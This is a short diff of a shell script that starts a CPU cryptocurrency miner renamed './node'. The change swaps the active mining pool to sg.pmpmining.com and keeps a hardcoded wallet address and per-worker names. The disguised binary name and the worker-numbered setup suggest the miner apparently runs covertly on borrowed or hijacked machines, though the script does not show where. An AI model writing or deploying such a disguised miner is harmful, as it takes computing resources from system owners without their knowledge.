@@ -24,7 +24,8 @@ echo "start ${WORKER_NUMBER}"
 #./node -a yespower -o stratum+tcp://mine.pool.r4nd0m.us:6991 -u WXrBvF4x5fLiaw7aiWycJfbcVKukheuxak.crf_${HOURESX} -p c=SWAMP,mc=SWAMP > try.log
 # Qogecoin
 # ./node --disable-gpu -a YescryptR16 -o stratum+tcp://us-central.pmpmining.com:5090 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.net_${WORKER_NUMBER} --cpu-threads-intensity 4 --miner-priority 4 > try.log
-./node --disable-gpu -a YescryptR16 -o stratum+tcp://mining-pool.zapto.org:3735 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.crf_${WORKER_NUMBER} -p d=0.1 --cpu-threads-intensity 4 --miner-priority 4 > try.log
+#./node --disable-gpu -a YescryptR16 -o stratum+tcp://mining-pool.zapto.org:3735 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.crf_${WORKER_NUMBER} -p d=0.1 --cpu-threads-intensity 4 --miner-priority 4 > try.log
+./node --disable-gpu -a YescryptR16 -o stratum+tcp://sg.pmpmining.com:5090 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.crf_${WORKER_NUMBER} -p d=0.1 --cpu-threads-intensity 4 --miner-priority 4 > try.log
 # Crionic
 #./node --disable-gpu -a yespowerltncg -o crnc.miners-pool.com:23007 -u KCxkuCyNyB9CDMujccuvWxCz5PUDoyxpSv.${WORKER_NUMBER}_crf > try.log
 #./node --disable-gpu -a yespowerltncg -o mine.pool.r4nd0m.us:8919 -u KCxkuCyNyB9CDMujccuvWxCz5PUDoyxpSv.crf_${WORKER_NUMBER} -p c=CRNC,mc=CRNC,m=solo > try.log
